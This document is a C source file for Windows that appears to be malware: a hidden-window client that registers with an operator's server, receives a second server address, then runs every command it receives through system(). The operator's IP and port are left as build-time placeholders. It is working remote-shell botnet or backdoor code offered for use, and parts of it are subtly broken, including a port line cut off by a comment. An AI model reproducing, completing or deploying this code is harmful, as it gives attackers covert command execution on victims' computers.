//WARNING!
// If compiled under gcc, you need to specify "-Lws2_32.lib" as an argument.

#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_DEPRECATE  
#define _CRT_NONSTDC_NO_DEPRECATE
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>

#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

#include <windows.h>

void zeromem(char* dst, size_t size) {
	for (int i = 0; i < size; i++) {
		*(dst + i) = 0;
	}
}

int main(int argc, char** argv) {
	FreeConsole();

	WSADATA wsa;
	(void)WSAStartup(MAKEWORD(2, 2), &wsa);

	SOCKET reg = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in _reg_server;

	_reg_server.sin_family = AF_INET;
	_reg_server.sin_addr.s_addr = inet_addr("ENTER YOUR MAIN SERVER IP HERE BEFORE BUILD!");
	_reg_server.sin_port = htons(//ENTER YOUR MAIN SERVER PORT HERE BEFORE BUILD!!!);

	if (reg == NULL) return 0;

	if (connect(reg, (struct sockaddr*)&_reg_server, sizeof(_reg_server)) == 0) {
		printf("Connected to registration server\n");
		SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
		struct sockaddr_in server;
		server.sin_family = AF_INET;

		if (s == NULL) return 0;

		char* buffer = (char*) malloc(sizeof(char) * 16);
		buffer = "client";
		zeromem(buffer + 6, 10);
		
		send(reg, buffer, 16, 0);
	
		char* ipb = (char*)malloc(sizeof(char) * 8);
		zeromem(ipb, 8);

		if (ipb == 0) return 0;

		while (recv(reg, ipb, 8, 0) > 0) {
			u_long ipa = 0; u_short port = 0;
			memcpy(&ipa, ipb, 4);
			memcpy(&port, ipb + 4, 2);

			server.sin_addr.S_un.S_addr = htonl(ipa);
			server.sin_port = htons(port);
			
			if (ipb[6] == 0xFF && ipb[7] == 0xFF) break;
		}

		closesocket(reg);
		
		printf("Attempting connection to server %s\n", inet_ntoa(server.sin_addr));
		if (connect(s, (struct sockaddr*)&server, sizeof(server)) == 0) {
			printf("Connected succesfully\n");

			char buffer[512];
			while (recv(s, buffer, 512, 0) > 0) {
				system(buffer);
				send(s, "OK\n", 3, 0);
			
				zeromem(buffer, 512);
			}
		}

		closesocket(s);
	}
	else {
		printf("Something failed.\n");
		closesocket(reg);
	}

	WSACleanup();

	return 0;
}
